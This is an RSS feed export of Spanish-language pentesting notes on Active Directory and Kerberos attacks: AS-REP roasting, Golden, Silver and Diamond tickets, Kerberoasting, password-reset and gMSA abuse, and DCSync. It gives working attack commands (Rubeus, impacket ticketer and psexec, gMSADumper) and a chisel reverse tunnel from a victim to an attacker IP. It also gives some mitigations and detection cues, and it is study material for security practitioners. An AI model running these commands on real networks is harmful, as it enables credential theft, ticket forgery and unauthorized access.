Copy<br>En caso de que algun usuario tenga la configuración UF_DONT_REQ_PREAUTH seteada, podríamos obtener el hash NTLMv2 e intentar crackear este. <br>Adicionalmente, otra manera de obtener el hash NTLMv2 dada una lista de usuarios, sería con la herramienta utilizada previamente como kerbrute, donde en algunos casos detecta la configuración UF_DONT_RE_PREAUTH seteada y se encarga de a la par que validarnos el usuario, dumpearnos su hash correspondiente. <br>kerbrute userenum --dc {target_ip} -d {domain} {file_users.txt}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/as-rep-roast-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Kerberos Vulns/AS-REP Roast Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:52:46 GMT</pubDate></item><item><title><![CDATA[<a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket" target="_blank">Diamond Ticket Attack</a>]]></title><description><![CDATA[ 
 <br><br>El ataque Diamond Ticket así como el <a data-href="Golden Ticket Attack" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/golden-ticket-attack.html" class="internal-link" target="_self" rel="noopener nofollow">Golden Ticket Attack</a>, permite obtener acceso a cualquier servicio como cualquier usuario. El Golden Ticket se falsifica completamente fuera de línea, se cifra con el hash krbtgt de ese dominio y luego se pasa a una sesión de inicio de sesión para su uso. El problema es que existen dos técnicas habituales para detectar el uso de golden tickets y es por la busqueda de TGS-REQ que no tengan AS-REQ (Mirar <a data-href="KERBEROS_AUTHETICATION_FLOW" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos_authetication_flow.html" class="internal-link" target="_self" rel="noopener nofollow">KERBEROS_AUTHETICATION_FLOW</a>) o buscando TGT que tengan valores 'tontos' como vida útil predeterminada de 10 años de Mimikatz.<br>
Ahora... un diamond ticket se genera modificando los campos de un TGT legítimo emitido por un DC. Esto se logra solicitando un TGT, descifrándolo con el hash krbtgt del dominio, modificando los campos deseados del ticket y luego volviéndolo a cifrar. Esto supera las dos deficiencias del <a data-href="Golden Ticket Attack" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/golden-ticket-attack.html" class="internal-link" target="_self" rel="noopener nofollow">Golden Ticket Attack</a>. Dado que el TGT es legítimo, tiene un AS-REQ previo así como al haber sido emitido por el DC, tendrá todos los detalles correctos.<br><br><br>
<br>
Recolección de Información: En el ataque Diamond Ticket, el atacante comienza recopilando información crítica sobre la infraestructura de red del objetivo. Esto puede incluir la obtención del Hash NT de la cuenta KRBTGT en el Domain Controller, que es esencial para generar el Diamond Ticket.

<br>
Obtención de Credenciales: Para generar un Diamond Ticket, el atacante debe obtener el hash NT del KRBTGT y otros datos sensibles del entorno, similar al Golden Ticket. Esto puede lograrse mediante técnicas como el robo de credenciales a través de herramientas como Mimikatz o mediante la explotación de vulnerabilidades.

<br>
Generación del Diamond Ticket: Con el hash NT del KRBTGT y otros datos recopilados, el atacante utiliza herramientas especializadas para crear un Diamond Ticket. Este ticket forjado se firma criptográficamente y es prácticamente indistinguible de un TGT legítimo, al igual que en el Golden Ticket Attack.

<br>
Persistencia y Acceso Ilimitado: Igual al Golden Ticket, el Diamond Ticket generado por el atacante tiene una vida útil larga y se puede utilizar de manera persistente. Proporciona acceso ilimitado a la red y a todos los recursos protegidos por el sistema de autenticación Kerberos, incluyendo servidores, sistemas de almacenamiento y otros recursos.

<br><br><br>Por ejemplo, supongamos que tenemos acceso al sistema víctima, en donde contamos con rubeus (Herramienta para realizar ataques y pruebas de penetración en Windows, con gran capacidad de llevar a cabo ataques y tareas relacionadas con <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a>), con esta herramienta podemos llevar acabo un Diamond Ticket Attack.<br>
Primero podríamos obtener el RID del usuario.<br>powershell Get-DomainUser -Identity &lt;username&gt; -Properties objectsid
Copy<br>Posteriormente hacer uso de rubeus para llevar a cabo este ataque. <br>.\Rubeus.exe diamond /tgtdeleg /ticketuser:{username} /ticketuserid:{RID_username} /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/diamond-ticket-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Kerberos Vulns/Diamond Ticket Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:53:13 GMT</pubDate></item><item><title><![CDATA[<a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket" target="_blank">Golden Ticket Attack</a>]]></title><description><![CDATA[ 
 <br><br>El ataque Golden Ticket es una técnica de explotación utilizada en entornos que emplean el protoclo de autenticación de <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a>. Permite a un atacante generar y utilizar un TGT (Ticket Granting Ticket, token de autenticación que se utiliza para solicitar TGS), válido de forma indefinida, lo que le otorga acceso persistente y no autorizado a una red corportavia. Este ataque es muy peligroso y potencialmente devastador, ya que puede permitir al atacante acceder a recursos críticos de la red sin ser detectado durante un período prolongado de tiempo, a cualquier servicio como cualquier usuario.<br><br><br>
<br>
Recolección de Información: El atacante comienza recopilando información crítica sobre la infraestructura de red del objetivo. Esto puede incluir la obtención del Hash NT de la cuenta KRBTGT en el Domain Controller, que es esencial para generar el Golden Ticket.

<br>
Obtención de Credenciales: Para generar un Golden Ticket, el atacante debe obtener el hash NT del KRBTGT y otros datos sensibles del entorno. Esto puede lograrse mediante técnicas como el robo de credenciales a través de herramientas como Mimikatz.

<br>
Generación del Golden Ticket: Con el hash NT del KRBTGT y otros datos recopilados, el atacante utiliza herramientas especializadas para crear un Golden Ticket. Este ticket forjado se firma criptográficamente y es prácticamente indistinguible de un TGT legítimo.

<br>
Persistencia: El Golden Ticket generado por el atacante tiene una vida útil larga (generalmente 10 años) y se puede utilizar de manera persistente. Incluso si las contraseñas de los usuarios cambian, el Golden Ticket sigue siendo válido y permite al atacante acceder a recursos críticos durante un largo período de tiempo.

<br>
Acceso Ilimitado: El Golden Ticket otorga al atacante acceso ilimitado a la red y a todos los recursos protegidos por el sistema de autenticación Kerberos. Esto incluye el acceso a servidores, sistemas de almacenamiento y cualquier recurso que utilice Kerberos para la autenticación.

<br><br><br>Por ejemplo, podemos estar en tenencia de el Hash NT de la cuenta de sistema KRBTGT el cual podemos utilizar para realizar un Golden Ticket Attack.<br>
En este caso, es crucial tener en cuenta que debemos enfrentarnos a un escenario en el cual tenemos que tener:<br>
1) El Hash NT del KRBTGT: Este puede ser obtenido del proceso LSASS (Local Security Authority Subsystem Service) o del archivo NTDS.dit (Base de datos que almacena datos de Active Directory, podría realizarse <a data-href="Abuso de SeBackupPrivilege" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/abuso-de-sebackupprivilege.html" class="internal-link" target="_self" rel="noopener nofollow">Abuso de SeBackupPrivilege</a>) o incluso a raiz de un <a data-href="DC Sync Attack" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/dc-sync-attack.html" class="internal-link" target="_self" rel="noopener nofollow">DC Sync Attack</a>.<br>
2) Nombre de dominio completo.<br>
3) El SID del Domain (Security Identifier): Identificador único y alfanumérico que se utiliza en los sistemas operativos Windows para identificar de manera única a usuarios, grupos y objetos de seguridad dentro de un dominio o una red.<br>Teniendo en cuenta que el TGT de caualquier usuario puede ser creado en este ataque, podemos una vez más, al igual que en el <a data-href="Silver Ticket Attack" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/silver-ticket-attack.html" class="internal-link" target="_self" rel="noopener nofollow">Silver Ticket Attack</a> hacer uso de las herramientas impacket-getPac, impacket-ticketer y impacket-psexec.<br>
Obtener el RID del Dominio:<br>impacket-getPac -targetUser {username} -hashes :{nt_hash} {domain}/{username}
Copy<br>Una vez que tengamos el SID del dominio, solo faltaría solicitar el Golden Ticket (TGT) con herramientas como impacket-ticketer o ticketer.py, es importante tener en cuenta que la ventaja de crear un TGT es que en a diferencia del TGS, este nos permite en cambio tener acceso a cualquier servicio o máquina en el dominio.<br>python3 ticketer.py -nthash {hash_nt} -domain-sid {sid} -domain {domain} {user} 

impacket-ticketer -nthash {hash_nt} -domain-sid {sid} -domain {domain} {user} 
Copy<br>Una vez obtenido el ticket, como siempre solo hace falta exportarlo con la variable de entorno KRB5CCNAME y hacer uso de herramientas como impacket-psexec o psexec.py para la ejecución de acciones de manera remota.<br>export KRB5CCNAME={path/to/user.ccache/downloaded}

python3 psexec.py {dc}/{username}@{ip} -k -no-pass

impacket-psexec {dc}/{username}@{ip} -k -no-pass
Copy<br>Obteniendo así, una vez más, la <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/golden-ticket-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Kerberos Vulns/Golden Ticket Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:54:06 GMT</pubDate></item><item><title><![CDATA[Kerberoasting]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:blueteam" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blueteam</a> 
 <br><br>El Kerberoasting attack es una técnica utilizada para extraer contraseñas de cuentas de usuarios en un dominio de Windows que utiliza el protocolo de autenticación de <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a>.<br>Kerberos permite a los usuarios autenticarse de forma segura en un dominio y recibir un "ticket" (TGS) que se puede utilizar para acceder a los recursos de la red. Los tickets de Kerberos están encriptados utilizando la clave de cifrado del servidor de dominio (NTLM). <br>En este ataque, el atacante aprovecha una debilidad en el proceso de autenticación de Kerberos para extraer contraseñas en forma de "hashes" de los tickets de servicio. Los tickets de servicio son tickets utilizados por servicios de dominio para autenticarse en otros sistemas dentro de la red. Estos tickets contienen información cifrada, incluyendo el nombre de la cuenta de servicio y un hash de la contraseña de la cuenta. <br>El atacante recopila los tickets de servicio de la red y luego los extrae para obtener los hashes de las contraseñas asociadas a las cuentas de servicio. Estos hashes pueden ser descifrados offline utilizando técnicas de cracking para obtener las contraseñas en texto plano. <br><br><br>
<br>
Identificación de usuarios con cuentas de servicio: Para llevar a cabo un ataque de Kerberoasting es importante identificar cuentas de servicio en el dominio de Active Directory. Estas son cuentas de usuario especiales que se utilizan para ejecutar servicios en servidores y a menudo se configuran para que puedan autenticarse en un dominio y solicitar TS (Ticket Service).

<br>
Solicitud de tíquets de serivicio: Una vez que se identifican las cuentas de servicio, un atacante solicita tíckets de servicio para estas cuentas utilizando <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a>. Estos tickets de servicio se cifran utilizando el hash NTLM de la contraseña del servicio.

<br>
Exfiltración de tickets cifrados: Una vez que el atacante ha obtenido los tickets cifrados, estos se extraen del entorno de AD. El atacante puede realizar esto de manera discrea y sin despertar sospechas.

<br>
Ataque offile: Una vez con los tickets cifrados en su posesión, el atacnte intenta descrifrar los hashes NTLM correspondientes a las contraseñas de los serivcios. Esto se hace de forma offline, lo que significa que el atacante puede probar diferentes contraseñas sin activar alarmas de seguridad en el entorno de AD.

<br>
Contraseñas débilles o vulnerables: Si las contraseñas de los serivcios son débiles o vulnerables, el ataque Kerberoasting tendrá éxito y el atacante obtendrá las contraseañs reales en texto claro correspondinetes a las cuentas de servicio comprometidas.

<br>
Uso de las contraseñas obtenidas: Con las contraseñas de servicio en su poder, el atacnte puede utilizarlas para acceder a sistemas y servicios adeicionales en el entorno, lo que puede conducir a un mayor compromiso de la red. 

<br><br><br>Para obtener SPNs (Service Principal Names), es decir, cuentas de servicio, podemos hacer uso de herramientas como imapcket-GetUserSPNs, perteneciente a la suite de impacket (Conjunto de herramientas desarrolladas en python para tareas relacionadas con la explotación y analisis de protocolos y servicios de Windows y redes). Por ejemplo, una vez que tengamos credenciales válidas (Las cuales podrían ser validadas con herramientas como crackmapexec), podríamos plantearnos realizar un Kerberoasting attack. <br>impacket-GetUserSPNs {domain}/{username}:{password} -request

impacket-GetUserSPNs -request -dc-ip {dc_ip} {domain.full}/{username}:{password} -outputfile hashes.kerberos

impacket-GetUserSPNs -request -dc-ip {dc_ip} -hashes :{nt_hash} {domain}/{username} -outputfile hashes.kerberos
Copy<br>En caso de que haya algun usuario vulnerable el cual sea detectado con la herramienta impacket-GetUserSPNs podríamos utilizar el parametro -request para solicitar un TGS y así posteriormente intentar crackear este. <br>Otro ejemplo, en caso de que tengamos un usuario que disponga de UF_DONT_REQUEST_PREAUTH podríamos hacer uso de otra version de impacket disponible en el respositorio de <a data-tooltip-position="top" aria-label="https://github.com/ShutdownRepo/impacket.git" rel="noopener nofollow" class="external-link" href="https://github.com/ShutdownRepo/impacket.git" target="_blank">ShutDown Impacket</a>, en donde podremos cambiarnos a la rama de getuserspns-nopreauth para hacer uso de la herramienta GetUserSPNs con la flag -no-preauth. <br>GetUserSPNs.py {domain}/ -no-preauth "{user_with_UF_DONT_REQUEST_PREAUTH=true}" -usersfile {users.txt} -dc-ip {ip} -request
Copy<br>De esta manera, al ejecutar el anterior comando estaremos intentando solicitar un TGS para todas los usuarios almacenados, aunque solo tendremos éxito en este ataque, es decir, recibir el TGS con el hash NTLM en su interior si el usuario es kerberoasteable (Que las credenciales están configuradas de manera que se almacenan).<br><br><br>En algunos casos, puede ser que nos enfrentemos a escenarios en donde no podemos llevar a cabo un Kerberoasting Attack por configuraciones, falta de exposición de kerberos, errores, etc. pero es importante tener en cuenta probar esto una vez que accedamos al sistema como algún usuario, en ese caso podemos hacer uso de herramientas como <a data-tooltip-position="top" aria-label="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" rel="noopener nofollow" class="external-link" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" target="_blank">Rubeus</a> para efectuar el mismo. (Podemos encontrar el binario compilado en el <a data-tooltip-position="top" aria-label="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" rel="noopener nofollow" class="external-link" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank">repositorio de ghostpack</a>).<br>Una vez descargado y transferido a la máquina víctima, podemos hacer uso de este para efectuar un Kerberoasting Attack:<br>&gt; .\Rubeus.exe kerberoast /creduser:{domain}\{user} /credpassword:{password}
Copy<br>En caso de que existiesen usuarios con la configuración UF_DONT_REQUEST_PREAUTH su hash NTLMv2 será devuelto en el output, dandonos así la pauta de que este ataque fue ejecutado de manera correcta puediendo así intentear crackear el/los mismo/s de manera offline. <br><br>Es importante tener en cuenta que así como puede ser que el kerberoastin attack sea llevado a cabo únicamente de manera remota por diversos motivos, en caso de que tengamos acceso al sistema y sea por la falta de exposición del protocolo kerberos, estando este accesible desde la máquina de manera local pero no de manera remota, además de hacer uso de rubeus también podríamos hacer uso de conceptos de <a data-href="Pivoting" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/pivoting/pivoting.html" class="internal-link" target="_self" rel="noopener nofollow">Pivoting</a>.<br>Por ejemplo, cuando usamos el sigueinte comando obtenemos los usuarios kerberoasteables:<br>impacket-GetUserSPNs {domain}\{user}:{password}
Copy<br>Pero al momento de agregarle la flag -request obtenemos un error debido a que <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a> no se encuentra expuesto. Es importante tener en cuenta que esto es posible ya que no es hasta que ingresamos esta flag que autenticamos contra kerberos, por detras, impacket-GetUserSPNs lo que hace es establecer una conexión con el DC utilizando Kerberos o NTLM y luego solicita la información sobre los Service Principal Names.<br>Retomando con el <a data-href="Pivoting" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/pivoting/pivoting.html" class="internal-link" target="_self" rel="noopener nofollow">Pivoting</a>, sabemos que tenemos que hacer uso de <a data-tooltip-position="top" aria-label="https://github.com/jpillora/chisel" rel="noopener nofollow" class="external-link" href="https://github.com/jpillora/chisel" target="_blank">Chisel</a> para poder crear un cliente-servidor, pero lo que debemos tener en cuenta que es que además del puerto 88 (Kerberos), deberíamos traernos el puerto 389 (Ldap).<br>Máquina atacante:<br>./chisel server --reverse 1234
Copy<br>Máquina víctima:<br>./chisel client {Attacker_IP}:1234 R:88:127.0.0.1:88 R:289:127.0.0.1:389
Copy<br>Una vez generado el servidor y conectado al mismo portforwardeando el puerto de Kerberos y Ldap, podemos intentar realizar un Kerberoasting attack teniendo en cuenta que el mismo deberá ser apuntado contra nuestro localhost debido a que ahora en nuestra máquina atacante por el puerto 88 y 389 en realidad tenemos el puerto 88 y 389 de la máquina víctima.<br>impacket-GetUserSPNs {domain}/{user}:{password} -request -dc-ip 127.0.0.1
Copy<br>En caso de que haya usuarios con la configuración UF_DONT_REQUEST_PREAUTH, una vez más, será completado de manera exitosa este ataque.<br><br><br>
<br>Uso de contraseñas fuertes: La primera línea de defensa es asegurarse de que todas las cuetnas de servicio tengan contraseñas fuertes y únicas. Esto hace que sea mucho más difícil para los atacantes realizar este ataque, ya que la contraseña es más difícil de descifrar.
<br>Uso de contraseñas gestionadas: En lugar de permitir que los administradores configuren manulamente contraseñas para cuentas de servicio, considere el uso de soluciones de gestión de contraseñase que generen y almacenen contraseñas de manera segura.
<br>Rotación regular de contraseñas: Implementar políticas de rotración de contraseñas para ceuntas de servicio. Cuanto más a menudo cambie las contraseñas, menor será el tiempo que un atacante potencial tendría para realizar este ataque.
<br>Monitoreo ode actividad anómala: Establecer sistemas de monitoreo y alerta que puedan detectar actividades inusuales en el AD, como intentos repetidos de acceso a ceutnas de servicio o acceso no autorizado a los registros de eventos de <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a>.
<br>Uso de soluciones de seguridad avanzadas: Considerara la implementación de soluciones de seguiridad avanzada que puedan detectar y prevenir este ataque mediante la detección de patrones de comportamiento inusuales o el monitoreo en tiempo real de la autenticación de <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a>.
<br>Implementacipón de políticas de seguridad adecuadas: Asegurarsse de que la organización tenga políticas de segurida bien definidas y qeu se sigan de manera consistente. Esto incluye el acceso a cuetnas de servicio y el uso de cuentas con privilegios elevados.
<br><br>Para detectar un Kerberoasting Attack puede ser muy útil generar detecciones a raiz de los siguientes puntos a tener en cuenta.<br>
<br>1) Se solicitan TGS con cifrado RC4.
<br>2) Evento 4769 en el Domain Controller (Filtrando por tickets con tipo de encriptado 0x17, cuentas de servicio conocidas y computadoras)
]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/kerberoasting-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Kerberos Vulns/Kerberoasting Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 17 Sep 2024 13:38:15 GMT</pubDate></item><item><title><![CDATA[<a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket" target="_blank">Silver Ticket Attack</a>]]></title><description><![CDATA[ 
 <br><br>El ataque Silver Ticket es una técnica de explotación utilizada en entornos que emplean el protoclo de autenticación de <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a>. Permite a un atacante generar un Ticket Granting Service (TGS). Un Silver Ticket es un ticket de autenticación falsificado que aveces se crea cuando un atacante roba la contraseña de una cuenta.<br><br><br>
<br>
Recolección de información: El atacante comienza recopilando información sobre la infraestructura de red objetivo. Esto puede incluir la identificación de controladores de dominio, servidores de aplicaciones y serviciios de alto valor.

<br>
Obtención de credenciales: El atacante primero necesita obtener credenciales válidas para algún servicio o sistema dentro de la red. Esto podría lograrse a través de métodos como phishing, robo de contraseñas, explotación de vulnerabilidades o el uso de credenciales filtradas.

<br>
Generación del Silver Ticket: Una vez que al atacante tiene acceso a las credenciales se un SPN (Service Principal Name) puede generar un Silver Ticket ( Que no deja de ser un TGS), pero con datos robados.

<br>
Uso del Silver Ticket: El atacante utiliza el Silver Ticket para autenticarse ante un servicio o recursos específico dentro de la red. Esto puede incluir servidores de archivos, base de datos o cualquier otro recurso protegido por el sistema de autenticación de <a data-href="Kerberos" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberos</a>.

<br><br><br>Por ejemplo, podemos estar en tenencia de el Hash NT de un usuario perteneciente a una cuenta de servicio (SPNs) el cual podemos utilizar para intentar realizar un Silver Ticket Attack. <br>En este caso, es crucial tener en cuenta que debemos enfrentarnos a un escenario muy específico en el cual tenemos que tener:<br>1) El Hash NT de un usuario.<br>
2) Que el usuario sea una SPNs (Cuenta de Servicio).<br>
3) El SID del Domain (Security Identifier): Identificador único y alfanumérico que se utiliza en los sistemas operativos Windows para identificar de manera única a usuarios, grupos y objetos de seguridad dentro de un dominio o una red.<br>Para obtener el Hash NT del usuario podría ser obtenido por técnicas como <a data-href="Kerberoasting Attack" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/kerberoasting-attack.html" class="internal-link" target="_self" rel="noopener nofollow">Kerberoasting Attack</a>, <a data-href="SMB Relay" href="https://dobliuw.com/SMB Relay" class="internal-link" target="_self" rel="noopener nofollow">SMB Relay</a>, explotación de vulnerabilidades, etc. Una vez entenencia del mismo, podríamos intentar obtener el SID haciendo uso de herramientas de la suite de impacket como imapacket-getPac.<br>impacket-getPac -targetUser {username} -hashes :{nt_hash} {domain}/{username}
Copy<br>Una vez que tengamos el SID del dominio, solo faltaría solicitar el Silver Ticket (TGS) con herramientas como impacket-ticketer o ticketer.py<br>python3 ticketer.py -nthash {hash_nt} -domain-sid {sid} -domain {domain} -spn {service}/{server} {user} 

impacket-ticketer -nthash {hash_nt} -domain-sid {sid} -domain {domain} -spn {service}/{server} {user} 
Copy<br>Una vez obtenido el ticket, como siempre solo hace falta exportarlo con la variable de entorno KRB5CCNAME y hacer uso de herramientas como impacket-psexec o psexec.py para la ejecución de acciones de manera remota.<br>export KRB5CCNAME={path/to/user.ccache/downloaded}

python3 psexec.py {dc}/{username}@{ip} -k -no-pass

impacket-psexec {dc}/{username}@{ip} -k -no-pass
Copy<br>Obteniendo así, una vez más, la <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/silver-ticket-attack.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Kerberos Vulns/Silver Ticket Attack.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:55:07 GMT</pubDate></item><item><title><![CDATA[ForceChangePassword]]></title><description><![CDATA[ 
 <br><br>Esta capacidad que pueden llegar a tener algunos usuarios sobre otros nos permite cambiar la contraseña del usuario sobre el cual se tiene esta capacidad sin conocer la contraseña actual.<br><br><br>Como vimos anteriormente si podemos abusar de ForceChangePassword quiere decir que un usuario 1 puede cambiar la contraseña de un usuario 2, sobre el cual se tiene que tener esta capacidad, una vez identificada esta con herramientas como bloodhound en <a data-href="Recopilación de información del sistema." href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/3.-operative-systems/windows/recopilación-de-información-del-sistema..html" class="internal-link" target="_self" rel="noopener nofollow">Recopilación de información del sistema.</a> <br><br>net rpc password '{user_to_change_password}' -U '{user_with_ForceChangePassword}' -S {target_ip}
Copy<br>Una vez ejecutado el siguiente comando se nos pedirá la contraseña nueva a ingresar para el usuario que queremos cambiarle la contraseña y posteriormente la contraseña del usuario que posee esta capacidad para así dar como exitoso el cambio de la contraseña. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/abuso-de-forcechangepassword.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Abuso de ForceChangePassword.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:49:40 GMT</pubDate></item><item><title><![CDATA[ReadGMSAPassword]]></title><description><![CDATA[ 
 <br><br>El permiso ReadGMSAPassword en Windows es un permiso que permite leer la contraseña del objeto GMSA (Group Managed Service Account). Los GMSA son cuentas administradas por grupos que se utilizan para ejecutar servicos en entornos de dominio de Active Directory. Estas cuentas porporcionan una solución de administració nde contraselas más segura para servicvios y aplicaciones en comparación con las cuentas de usuario regulares.<br>El permiso ReadGMSAPassword permite leer la contraseña de la cuenta GMSA. Esta cuenta de servicio está diseñada para manejar ciertas configuraciones y rpoporcionar una identidad y contexto de seguridad para cervicios o palicaciones en un entorn ode dominio en Windows.<br><br><br>Para explotar y abusar del permiso ReadGMSAPassword podríamos hacer uso de herramientas como <a data-tooltip-position="top" aria-label="https://github.com/micahvandeusen/gMSADumper" rel="noopener nofollow" class="external-link" href="https://github.com/micahvandeusen/gMSADumper" target="_blank">gMSADumpper</a> la cual nos permite intentar obtener el hash del GMSA sin tener acceso al sistema. <br>python3 gMSADumper.py -u '{username}' -p '{password}' -l {target_ip} -d {domain} 
Copy<br>En este punto, una vez proporcionada las credenciales del usuario que tenga el permiso ReadGMSAPassword la herramienta nos arrojara el hash NTLM del Service Account. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/abuso-de-readgmsapassword.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/1. Windows/Abuso de ReadGMSAPassword.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:49:43 GMT</pubDate></item><item><title><![CDATA[DCsync Attack]]></title><description><![CDATA[ 
 <br><br>Un Dc Syn Attack es un tipo de ataque informático que se enfoca en comprometer un controlador de dominio (DC) en un entorno de Active Directory. Este ataque se basa en el uso de credenciales del atacante para solicitar información sobre cuentas de usuario desde el controlador de dominio.<br>Este ataque le permite al atacante simular el comportamiento del Domain Controller y recuperar datos de conraseñas a través de replicación de domino. <br>El proceso de este ataque suele ser en líneas generales de la siguiente manera:<br>
<br>El atacante descubre el domain controller para solicitar la replicación.
<br>El atacante solicita la replicación de usuarios mediante GetNCChangesolic
<br>El DC retorna la respuesta, inluyendo los hashes de las contraseñas de los usuarios. 
